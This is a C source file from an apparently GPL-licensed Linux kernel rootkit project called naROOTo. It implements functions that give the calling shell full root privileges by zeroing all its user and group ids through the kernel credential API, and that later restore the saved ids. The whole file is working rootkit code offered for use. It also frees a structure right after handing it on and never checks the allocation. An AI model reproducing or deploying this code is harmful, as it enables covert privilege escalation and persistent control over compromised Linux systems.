/******************************************************************************
 *
 * Name: priv_escalation.c 
 * This file provides all the functionality needed for privilege escalation
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/slab.h>

#include "control.h"
#include "include.h"

/* Function to issue the root privileges for shell */
int priv_escalation(void)
{
	struct task_struct *process;
	struct cred *pcred = prepare_creds();
	int retv = -EINVAL;
	process = current;

	if (!(is_shell_escalated(process->pid))) {
		struct escalated_pid *id_struct;
		id_struct = kmalloc(sizeof(struct escalated_pid), GFP_KERNEL);

		id_struct->uid = pcred->uid.val;
		id_struct->euid = pcred->euid.val;
		id_struct->suid = pcred->suid.val;
		id_struct->fsuid = pcred->fsuid.val;
		id_struct->gid = pcred->gid.val;
		id_struct->egid = pcred->egid.val;
		id_struct->sgid = pcred->sgid.val;
		id_struct->fsgid = pcred->fsgid.val;

		id_struct->pid = process->pid;

		pcred->uid.val = pcred->euid.val = pcred->suid.val =
		    pcred->fsuid.val = 0;
		pcred->gid.val = pcred->egid.val = pcred->sgid.val =
		    pcred->fsgid.val = 0;

		commit_creds(pcred);

		/* Add to the list of escalted ids */
		retv = escalate(id_struct);

		kfree(id_struct);
		ROOTKIT_DEBUG("pid of the terminal : %d Escalation done!!!\n",
			      process->pid);
	} else
		ROOTKIT_DEBUG("pid of the terminal : %d I'm already root!!\n",
			      process->pid);

	return retv;
}

/* Function to revoke the root privileges for shell */
int priv_deescalation(void)
{
	struct task_struct *process;
	struct cred *pcred = prepare_creds();
	int retv = -EINVAL;

	process = current;

	/* If the shell is given the root privileges then it will return a structute containing ids */
	struct escalated_pid *id_struct = is_shell_escalated(process->pid);
	if (id_struct != NULL) {
		pcred->uid.val = id_struct->uid;
		pcred->euid.val = id_struct->euid;
		pcred->suid.val = id_struct->suid;
		pcred->fsuid.val = id_struct->fsuid;
		pcred->gid.val = id_struct->gid;
		pcred->egid.val = id_struct->egid;
		pcred->sgid.val = id_struct->sgid;
		pcred->fsgid.val = id_struct->fsgid;

		commit_creds(pcred);

		/* Delete from the list of escalted ids */
		retv = deescalate(process->pid);
		ROOTKIT_DEBUG("pid of the terminal : %d Deescalation done!!!\n",
			      process->pid);
	} else
		ROOTKIT_DEBUG("pid of the terminal : %d I was never root!!\n",
			      process->pid);

	return retv;
}
